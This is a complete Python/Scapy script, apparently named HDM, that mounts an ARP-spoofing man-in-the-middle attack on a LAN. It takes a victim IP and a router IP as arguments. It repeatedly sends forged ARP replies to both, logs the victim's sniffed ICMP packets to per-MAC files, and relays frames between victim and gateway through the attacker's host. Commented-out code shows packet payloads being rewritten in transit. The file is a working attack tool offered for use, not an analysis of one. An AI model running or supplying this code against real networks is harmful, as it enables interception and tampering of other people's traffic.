#!/usr/bin/python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # supress warnins
from scapy.all import * # then import
logging.getLogger("scapy.runtime").setLevel(1) # then restore them
import argparse
import signal
import time
import os
import sys
from contextlib import contextmanager
import threading
import fcntl, socket, struct

def getHwAddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
    s.close()
    return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]

def getIpAddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = socket.inet_ntoa(fcntl.ioctl(s.fileno(), 
        0x8915, struct.pack('256s', ifname[:15]))[20:24])
    s.close()
    return info


def sniff(count=0, store=1, offline=None, prn = None, lfilter=None, L2socket=None, timeout=None, stopperTimeout=None, stopper = None, *arg, **karg):
    """Sniff packets
sniff([count=0,] [prn=None,] [store=1,] [offline=None,] [lfilter=None,] + L2ListenSocket args) -> list of packets

  count: number of packets to capture. 0 means infinity
  store: wether to store sniffed packets or discard them
    prn: function to apply to each packet. If something is returned,
         it is displayed. Ex:
         ex: prn = lambda x: x.summary()
lfilter: python function applied to each packet to determine
         if further action may be done
         ex: lfilter = lambda x: x.haslayer(Padding)
offline: pcap file to read packets from, instead of sniffing them
timeout: stop sniffing after a given time (default: None)
stopperTimeout: break the select to check the returned value of 
         stopper() and stop sniffing if needed (select timeout)
stopper: function returning true or false to stop the sniffing process
L2socket: use the provided L2socket
    """
    c = 0

    if offline is None:
        if L2socket is None:
            L2socket = conf.L2listen
        s = L2socket(type=ETH_P_ALL, *arg, **karg)
    else:
        s = PcapReader(offline)

    lst = []
    if timeout is not None:
        stoptime = time.time()+timeout
    remain = None

    if stopperTimeout is not None:
        stopperStoptime = time.time()+stopperTimeout
    remainStopper = None
    while 1:
        try:
            if timeout is not None:
                remain = stoptime-time.time()
                if remain <= 0:
                    break

            if stopperTimeout is not None:
                remainStopper = stopperStoptime-time.time()
                if remainStopper <=0:
                    if stopper and stopper():
                        break
                    stopperStoptime = time.time()+stopperTimeout
                    remainStopper = stopperStoptime-time.time()

                sel = select([s],[],[],remainStopper)
                if s not in sel[0]:
                    if stopper and stopper():
                        break
            else:
                sel = select([s],[],[],remain)

            if s in sel[0]:
                p = s.recv(MTU)
                if p is None:
                    break
                if lfilter and not lfilter(p):
                    continue
                if store:
                    lst.append(p)
                c += 1
                if prn:
                    r = prn(p)
                    if r is not None:
                        print r
                if count > 0 and c >= count:
                    break
        except KeyboardInterrupt:
            break
    s.close()
    return plist.PacketList(lst,"Sniffed")

def myExit(status):
    print " > HDM exit"
    exit(status)

def parse_args():
    help_message = "Usage: ./hdm.py -v V -r R [-h]\n where :\n V is victim IP\n R is router IP"
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-i", "--interface")
    parser.add_argument("-v", "--victimIP")
    parser.add_argument("-r", "--routerIP")
    parser.add_argument("-h", "--help", action="store_true")
    if parser.parse_args().help:
        print help_message
        exit(0)
    if not parser.parse_args().interface:
        print " > network interface not specified | use -h for more info"
        exit(0)
    if not parser.parse_args().victimIP:
        print " > victim IP not specified | use -h for more info"
        exit(0)
    if not parser.parse_args().routerIP:
        print " > router IP not specified | use -h for more info"
        exit(0)
    return parser.parse_args()

def originalMAC(ip):
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
    for s,r in ans:
        return r.sprintf("%Ether.src%")

@contextmanager
def stdout_redirected(new_stdout):
    save_stdout = sys.stdout
    sys.stdout = new_stdout
    try:
        yield None
    finally:
        sys.stdout = save_stdout

def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)

def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3, verbose=0)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3, verbose=0)
    print "\r > network defaults restored"

def test(pkt):
    data = [method for method in dir(pkt) if callable(getattr(pkt, method))]
    for call in data:
        print call
    # pkt.show()
    pass

class Logger(threading.Thread):
    def __init__(self):
        self.canRun = False
        super(Logger, self).__init__()

    def stopper(self):
        return not self.canRun

    def run(self):
        self.canRun = True
        sniff(prn=self.parsePacket, filter="icmp", store=0, stopperTimeout=1, stopper=self.stopper)

    def parsePacket(self, pkt):
        # print pkt.show()
        print pkt.sprintf("%IP.src%"), "->", pkt.sprintf("%IP.dst%")
        mac = pkt.sprintf("%Ether.src%")
        fileName = "./logs/" + mac.replace(':', '_')
        logFile = open(fileName, 'a+')
        Time = ''.join(("  ", time.strftime("%H:%M:%S"), "  ", time.strftime("%d/%m/%Y")))
        logFile.write(Time) # and Date
        logFile.write('\n')
        with stdout_redirected(logFile):
            pkt.show()
        logFile.write('\n')
        logFile.close()

    def stop(self):
        self.canRun = False
        print "Logger STOP"

class Poisoner(threading.Thread):
    def __init__(self, victimIP, victimMAC, routerIP, routerMAC):
        self.victimIP = victimIP
        self.victimMAC = victimMAC
        self.routerIP = routerIP
        self.routerMAC = routerMAC
        self.canRun = False
        super(Poisoner, self).__init__()

    def run(self):
        self.canRun = True
        while self.canRun:
            send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst=self.victimMAC), verbose=0)
            send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst=self.routerMAC), verbose=0)
            time.sleep(1.5)

    def stop(self):
        self.canRun = False
        print "Poisoner STOP"

class Editor(threading.Thread):
    def __init__(self, attackerIP, attackerMAC, victimIP, victimMAC, routerIP, routerMAC):
        self.attackerIP = attackerIP
        self.attackerMAC = attackerMAC
        self.victimIP = victimIP
        self.victimMAC = victimMAC
        self.routerIP = routerIP
        self.routerMAC = routerMAC
        self.canRun = False
        # self.null = open(os.devnull, "w")
        super(Editor, self).__init__()

    def stopper(self):
        return not self.canRun

    def run(self):
        self.canRun = True
        sniff(prn=self.parsePacket, store=0, stopperTimeout=1, stopper=self.stopper)

    def parsePacket(self, pkt):
        # print pkt.sprintf("%IP.src%"), "to", pkt.sprintf("%IP.dst%")
        # print pkt.sprintf("%Ether.src%"), "to", pkt.sprintf("%Ether.dst%")
        if self.routerMAC == pkt.sprintf("%Ether.src%"):
             # and self.victimIP == pkt.sprintf("%IP.dst%")
            pkt[Ether].dst = self.victimMAC
            pkt[Ether].src = self.attackerMAC
            print "TO THE VICTIM"
            sendp(pkt, verbose=0)
            print "v success"
        elif self.victimMAC == pkt.sprintf("%Ether.src%"):
            # and self.attackerIP != pkt.sprintf("%IP.dst%")
            pkt[Ether].dst = self.routerMAC
            pkt[Ether].src = self.attackerMAC
            print "TO THE GATEWAY"
            sendp(pkt, verbose=0)
            print "g success"

        # self.stop()
        # if pkt.haslayer(Raw):
        #     if "image1" in pkt[Raw].load:
        #         trrtt = pkt[Raw].load.replace("image1", "image0")
        #         if "image0" in trrtt:
        #             pkt[Raw].load = trrtt
        #             print "&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&"
        #             print pkt.sprintf("%Ether.dst%")
        #             # sendp(pkt)
        #             return
        # send(pkt)
        # exit(0)

    def stop(self):
        # self.null.close()
        self.canRun = False
        print "Editor STOP"


def main(args):
    print " > HDM start"
    if os.geteuid() != 0:
        print("[!] Please run as root")
        myExit(0)
    routerIP = args.routerIP
    victimIP = args.victimIP
    interface = args.interface
    print "routerIP:", routerIP
    print "victimIP:", victimIP
    print "interface:", interface
    routerMAC = originalMAC(args.routerIP)
    victimMAC = originalMAC(args.victimIP)
    attackerMAC = getHwAddr(interface)
    attackerIP = getIpAddr(interface)
    if routerMAC == None:
        print "Could not find router MAC address."
        myExit(0)
    if victimMAC == None:
        print "Could not find victim MAC address."
        myExit(0)
    if attackerMAC == None:
        print "Could not find attacker MAC address."
        myExit(0)
    if attackerIP == None:
        print "Could not find attacker IP address"
        myExit(0)
    print "routerMAC:", routerMAC
    print "victimMAC:", victimMAC
    print "attackerMAC:", attackerMAC
    print "attackerIP:", attackerIP
    def signal_handler(signal, frame):
        print ""
        # restore(routerIP, victimIP, routerMAC, victimMAC)
        log.stop(); # stop thread
        poi.stop(); # stop poisoner
        edi.stop(); # stop thread
        myExit(0)

        # with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        #     ipf.write('1\n')
    signal.signal(signal.SIGINT, signal_handler)

    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('1\n')

    log = Logger()
    log.start() # Log thread start
    poi = Poisoner(victimIP, victimMAC, routerIP, routerMAC)
    poi.start() # Poisoner start

    time.sleep(0.1)
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('0\n')
    edi = Editor(attackerIP, attackerMAC, victimIP, victimMAC, routerIP, routerMAC)
    edi.start() # Forwarder + Editor

    print " > HDM in progress"
    while 1:
        pass
main(parse_args())
